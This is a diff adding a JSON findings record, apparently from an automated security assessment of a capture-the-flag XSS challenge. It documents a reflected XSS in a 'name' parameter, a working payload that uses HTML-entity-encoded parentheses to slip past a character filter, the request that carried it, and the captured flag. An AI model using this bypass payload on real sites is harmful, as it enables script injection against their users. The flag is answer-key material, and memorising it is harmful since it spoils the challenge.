@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:08:54.090982+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "c55cc5b0-c049-4ae5-932a-fa74716cf80a",
+      "timestamp": "2026-04-12T22:08:54.090877+00:00",
+      "title": "XSS via HTML Entity Encoding Bypass in /page?name parameter",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43513/page",
+      "description": "The /page endpoint reflects the 'name' GET parameter unsanitized inside an <img src> attribute. The server filters '(' and '`' characters, but HTML entities (&#40; for '(' and &#41; for ')') bypass the filter. When the browser renders the page, it decodes the entities and executes the JavaScript. Payload: \" onerror=\"alert&#40;'XSS'&#41; \u2014 this triggers alert('XSS') by breaking out of the img src attribute and using the onerror event handler with HTML-entity-encoded parentheses.",
+      "evidence": "GET /page?name=%22+onerror%3D%22alert%26%2340%3B%27XSS%27%26%2341%3B\n\nResponse: Congratulations! Here is the flag: flag{426d7e40-5b2e-4780-a230-edaeb94c30ee}\n\nRendered HTML: <img src=\"\" onerror=\"alert&#40;'XSS'&#41;\">",
+      "tool_used": "http_request",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "c78899a8-25ba-4d53-b361-e3dd66601021",
+      "timestamp": "2026-04-12T22:09:04.995873+00:00",
+      "title": "Dalgona XSS Challenge - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Index[\"GET / - Index Page\"]\n  Index --> PageLink[\"Link to /page\"]\n  Browser --> Page[\"GET /page?name=VALUE\"]\n  Page --> Filter[\"Server-side Filter\\nBlocks: ( and backtick\"]\n  Filter --> Reflect[\"Reflects VALUE in\\n<img src=VALUE>\"]\n  Filter --> Check[\"Headless Browser Check\\nValidates alert(XSS) execution\"]\n  Check -->|Success| Flag[\"Returns flag{...}\"]\n  Check -->|Fail| Error[\"Returns Failed message\"]\n  Page --> Static[\"Static Assets\\n/static/css/ /static/img/\"]"
+    }
+  ]
+}
